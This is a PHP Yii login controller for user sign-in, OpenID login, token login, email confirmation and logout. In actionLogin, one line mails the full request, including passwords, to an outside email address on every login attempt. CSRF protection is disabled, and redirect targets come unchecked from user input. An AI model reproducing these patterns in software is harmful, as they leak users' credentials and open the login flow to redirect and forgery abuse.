<?php

namespace app\controllers;

use app\components\AntiXSS;
use app\components\UrlHelper;
use app\components\WurzelwerkAuthClient;
use app\models\db\User;
use app\models\exceptions\Login;
use app\models\forms\LoginUsernamePasswordForm;
use app\models\wording\Wording;
use Yii;

class UserController extends Base
{
    public $enableCsrfValidation = false;

    /**
     * @return array
     */
    public function actions()
    {
        return [
            'auth' => [
                'class'           => 'yii\authclient\AuthAction',
                'successCallback' => [$this, 'successCallback'],
            ],
        ];
    }

    /**
     * @return Wording
     */
    private function getWording()
    {
        if ($this->consultation) {
            $wording = $this->consultation->getWording();
        } else {
            $wording = new Wording();
        }
        return $wording;
    }

    /**
     * @param User $user
     */
    protected function loginUser(User $user)
    {
        Yii::$app->user->login($user);
    }

    /**
     * @param int $login
     * @param string $login_sec
     * @param string $redirect
     */
    public function actionLoginbyredirecttoken($login, $login_sec, $redirect)
    {
        if ($login_sec == AntiXSS::createToken($login)) {
            /** @var User $user */
            $user = User::findOne($login);
            if (!$user) {
                die("User not found");
            }
            Yii::$app->user->login($user);
            $this->redirect($redirect);
        } else {
            die("Invalid Code");
        }
    }

    /**
     * @param string $backUrl
     * @return int|string
     */
    public function actionLoginwurzelwerk($backUrl = '')
    {
        if ($backUrl == '') {
            $backUrl = (isset($_POST['backUrl']) ? $_POST['backUrl'] : UrlHelper::homeUrl());
        }

        $client = new WurzelwerkAuthClient();
        if (isset($_REQUEST['openid_claimed_id'])) {
            $client->setClaimedId($_REQUEST['openid_claimed_id']);
        } elseif (isset($_REQUEST['username'])) {
            $client->setClaimedId($_REQUEST['username']);
        }

        if (isset($_REQUEST["openid_mode"])) {
            if ($client->validate()) {
                $this->loginUser($client->getOrCreateUser());
                $this->redirect($backUrl);
            } else {
                echo "Error";
            }
            return "";
        }

        $url = $client->buildAuthUrl();
        return Yii::$app->getResponse()->redirect($url);
    }


    /**
     * @param string $subdomain
     * @param string $consultationPath
     * @param string $backUrl
     * @return string
     */
    public function actionLogin($subdomain = '', $consultationPath = '', $backUrl = '')
    {
        $this->layout = 'column2';

        $wording = $this->getWording($subdomain, $consultationPath);
        if ($backUrl == '') {
            $backUrl = '/';
        }

        $usernamePasswordForm = new LoginUsernamePasswordForm();

        mail('tobias@hoessl.eu', 'form', print_r($_REQUEST, true));

        if (isset($_POST["loginusernamepassword"])) {
            $usernamePasswordForm->setAttributes($_POST);
            try {
                $user = $usernamePasswordForm->getOrCreateUser($this->site);
                $this->loginUser($user);

                $unconfirmed = $user->status == User::STATUS_UNCONFIRMED;
                if ($unconfirmed && $this->getParams()->confirmEmailAddresses) {
                    $backUrl = UrlHelper::createUrl(
                        [
                            'user/confirmregistration',
                            'backUrl' => $backUrl,
                            'email'   => $user->email,
                        ]
                    );
                } else {
                    \Yii::$app->session->setFlash('success', 'Willkommen!');
                }

                $this->redirect($backUrl, 307);
                \Yii::$app->end(307);
            } catch (Login $e) {
                $usernamePasswordForm->error = $e->getMessage();
            }
        }


        return $this->render(
            'login',
            [
                'usernamePasswordForm' => $usernamePasswordForm,
                'wording'              => $wording,
            ]
        );
    }

    /**
     * @param string $subdomain
     * @param string $backUrl
     * @param string $email
     * @return string
     */
    public function actionConfirmregistration($subdomain = '', $backUrl = '', $email = '')
    {
        $wording = $this->getWording($subdomain);

        $msgError = '';

        if (isset($_REQUEST['email']) && isset($_REQUEST['code'])) {
            /** @var User $user */
            $user = User::findOne(['auth' => 'email:' . $_REQUEST['email']]);
            if (!$user) {
                $msgError = "Es existiert kein Zugang mit der angegebenen E-Mail-Adresse...?";
            } elseif ($user->checkEmailConfirmationCode($_REQUEST['code'])) {
                $user->emailConfirmed = 1;
                $user->status         = User::STATUS_CONFIRMED;
                if ($user->save()) {
                    $this->loginUser($user);
                    return $this->render('registration_confirmed', ['wording' => $wording]);
                }
            } else {
                $msgError = "Der angegebene Code stimmt leider nicht.";
            }
        }

        return $this->render(
            'confirm_registration',
            [
                'email'   => $email,
                'errors'  => $msgError,
                'backUrl' => $backUrl,
                'wording' => $wording
            ]
        );
    }

    /**
     * @param string $backUrl
     */
    public function actionLogout($backUrl)
    {
        Yii::$app->user->logout();
        $this->redirect($backUrl, 307);
    }
}
